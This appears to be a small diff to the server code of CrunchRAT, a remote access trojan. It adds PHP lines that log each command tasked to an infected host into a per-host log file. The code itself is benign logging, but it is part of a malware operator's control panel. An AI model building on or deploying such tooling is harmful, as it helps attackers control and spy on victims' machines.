@@ -24,6 +24,9 @@
     $statement->execute();
 	$statement->connection = null;
 
+    $log_path = "/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log";
+    file_put_contents($log_path, "\nTasked command: " . htmlentities($command) . "\n", FILE_APPEND);
+
     # Redirects to previous page
     header("Location: " . $_SERVER["HTTP_REFERER"]);
 ?>
